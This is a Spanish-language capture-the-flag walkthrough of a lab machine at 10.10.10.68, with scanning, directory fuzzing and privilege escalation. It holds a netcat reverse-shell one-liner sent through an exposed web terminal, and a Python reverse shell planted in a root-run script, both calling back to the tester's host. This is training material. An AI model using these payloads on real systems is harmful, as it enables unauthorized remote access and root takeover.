We will start with a scan of open ports and services using the nmap tool. 

`sudo nmap -p- --open -sS --min-rate 5000 -n -v -sV -Pn 10.10.10.68 > escaneo.txt`

![[Pasted image 20240829191529.png]]
Unicamente encontramos un servicio http abierto, por lo que escanearemos la web para obtener mas informacion mediante la herramienta whatweb
` whatweb -v 10.10.10.68`
![[Pasted image 20240829191706.png]]
![[Pasted image 20240829191718.png]]
Podemos ver informacion relevante como que el servicio web es un servidor  Apache/2.4.18 (Ubuntu)

Procedemos a visitar la web 
![[Pasted image 20240829191834.png]]Tras visitar la web no encontramos rutas interesantes ni formas de subir archivos etc...
Encontramos esta ruta en la web que nos habla de una especie de terminal web
![[Pasted image 20240829191959.png]]
Al no encontrar nada procedemos a hacer fuzzing de directorios pàra ver que podemos encontrar.
`ffuf -w Desktop/diccionario/Directorios/directory-list-2.3-medium.txt -u http://10.10.10.68/FUZZ -e .php,.js,.html,.txt -c`

Encontramos los siguientes directorios:
![[Pasted image 20240829192400.png]]
Ingresamos en el directorio dev, es el que mas me ha llamado la atención 
![[Pasted image 20240829192436.png]]
Encontramos dos archivos en php, vamos a ver el contenido del primero

![[Pasted image 20240829192522.png]]
Hemos encontrado la terminal web de la captura anterior.
Probamos a introducir una reverse shell directamente
Al probar con varias vemos que funciona con la siguiente 
`busybox nc 10.10.14.51 4444 -e sh`

![[Pasted image 20240829192809.png]]
Ya tenemos acceso a la reverse shell, tras hacer un tratamiento de la tty, procedemos a probar comandos como sudo -l, pero primero vemos la flag 
User flag 
![[Pasted image 20240829193618.png]]
`sudo -l`
![[Pasted image 20240829192944.png]]
Encontramos que el usuario scriptmanager puede lanzar comandos sin contraseña
![[Pasted image 20240829193037.png]]
Al no tener la contraseña intentaremos lanzar comandos como scriptmanager mediante sudo -u 
![[Pasted image 20240829193253.png]]
Probamos a lanzar una terminal como scriptmanager 
`sudo -u  scriptmanager bash`
![[Pasted image 20240829193343.png]]
Ya somos el usuario scriptmanager 
Intentamos buscar binarios con permisos SUID pero no encontramos nada interesante y tampoco podemos lanzar sudo -l.

![[Pasted image 20240829193716.png]]
Al listar la carpeta raiz vemos el directorio scripts, veamos que contiene
![[Pasted image 20240829194159.png]]
Encontramos que el archivo test.py cuando se ejecuta abre el archivo test.txt y escribe una frase y lo cierra, el archivo test.txt tiene permisos root, por lo que intuimos que test.py se esta ejecutando en intervalos de tiempo por el propio root, intentaremos pasarle una revese shell de python y esperar en escucha a ver si la ejecuta.

import socket,subprocess,os  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("10.10.14.51",4445)) 
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);


![[Pasted image 20240829200918.png]]
Ya tenemos privilegios root!!!!!!
Root flag
![[Pasted image 20240829200943.png]]